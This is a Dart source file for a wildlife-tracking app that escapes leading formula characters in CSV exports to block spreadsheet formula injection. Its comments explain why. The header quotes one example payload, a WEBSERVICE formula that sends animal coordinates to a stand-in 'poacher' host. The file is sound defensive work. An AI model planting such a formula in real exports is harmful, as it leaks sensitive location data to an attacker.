import 'package:csv/csv.dart';

/// The one place this app turns rows into CSV text.
///
/// ## Why this exists — finding L-3 (security model §14.4)
///
/// Every encoder called `Csv().encode(rows)` directly, with default quoting and
/// no formula neutralisation anywhere in the repository. A tag named
/// `=WEBSERVICE("http://poacher.example/?p="&TEXTJOIN(",",1,H2,I2))` went out
/// verbatim into `observations.csv`, where `latitude` is spreadsheet column H
/// and `longitude` is column I — so opening the file sent the animal's
/// coordinates to a host of the author's choosing. **The victim is the
/// recipient**, the payload is the most sensitive data this app holds, and the
/// export is the moment it leaves the team.
///
/// Reachable from outside the team, which is what made it a finding rather than
/// §5.7's accepted "exported data is unprotected as data": §4.19's clauses
/// govern *destruction*, and an insert-only archive destroys nothing, so a
/// hostile `.zip` plants the tag with no consent dialog and the app reports
/// "Inserted: 1". The user exports for a colleague weeks later.
///
/// ## Why it is a choke point rather than three fixes
///
/// §4.19.1 enumerated every path by which a file reaches the database and asked
/// *"can it modify an existing row?"* — a correct axis and an incomplete one:
/// **it never asked what the database can do to whoever opens what it
/// produces.** Export was not on the list. Fixing `observation_csv.dart`,
/// `tag_csv_export.dart` and `non_detection_csv.dart` in turn would leave the
/// fourth encoder — the one nobody has written yet — with the original defect,
/// which is the shape task 10.66's rule exists to refuse. Every encoder passes
/// through [encode]; the test in `test/security/csv_export_injection_test.dart`
/// asserts by grep that no call site bypasses it.
abstract final class SpreadsheetSafeCsv {
  /// The characters that make a spreadsheet treat a cell as something other
  /// than text.
  ///
  /// `=` and `@` open a formula in Excel, LibreOffice, Google Sheets and
  /// Numbers; `+` and `-` do in Excel and LibreOffice (and `-` is why the
  /// numeric carve-out below is not optional); a leading tab or carriage
  /// return is the standard way of smuggling one of the four past a filter
  /// that only looks at the first byte, because the spreadsheet skips the
  /// whitespace and the filter does not.
  static const Set<String> dangerousLeadingCharacters = {
    '=',
    '+',
    '-',
    '@',
    '\t',
    '\r',
    '\n',
  };

  /// Encodes [rows] with every cell neutralised.
  ///
  /// The row lists are not modified — an encoder is a pure formatter and a
  /// formatter that mutates its input is the defect finding L-6 was about, one
  /// layer down.
  static String encode(List<List<dynamic>> rows) => Csv().encode([
        for (final row in rows) [for (final cell in row) neutralize(cell)],
      ]);

  /// One cell, rendered so a spreadsheet reads it as text.
  ///
  /// **Numbers are returned untouched, and that carve-out is load-bearing
  /// rather than a convenience.** The standard escape prefixes a `'`, and this
  /// app's most important column — `longitude` — is negative across the entire
  /// western hemisphere, so escaping by first character alone would apostrophe
  /// every coordinate in Arizona and break the export for the science it
  /// exists for. A `num` did not come from a file or a text field; it came from
  /// a `REAL` column this app wrote, and it cannot carry a formula. The
  /// dangerous values are the *strings*, which is exactly where the untrusted
  /// text is.
  ///
  /// Leading whitespace is skipped when deciding, and preserved when writing:
  /// a spreadsheet ignores it before evaluating, so a filter that does not
  /// would be reading a different string than the one that gets executed.
  static Object? neutralize(Object? cell) {
    if (cell == null || cell is num || cell is bool) return cell;
    final text = cell.toString();
    if (text.isEmpty) return cell;
    final first = _firstSignificantCharacter(text);
    if (first == null || !dangerousLeadingCharacters.contains(first)) {
      return cell;
    }
    // The apostrophe is what Excel, LibreOffice and Numbers each read as
    // "this cell is text". It is visible in a plain-text viewer, which is the
    // accepted cost of the standard escape: a visible apostrophe on the few
    // cells that look like formulas, against an outbound request carrying a
    // den site.
    return "'$text";
  }

  /// The first character that decides how a spreadsheet reads the cell — the
  /// first non-space, non-tab, non-newline one, or the first character itself
  /// if that is what leads.
  static String? _firstSignificantCharacter(String text) {
    for (var i = 0; i < text.length; i++) {
      final char = text[i];
      if (char == ' ') continue;
      return char;
    }
    return null;
  }
}
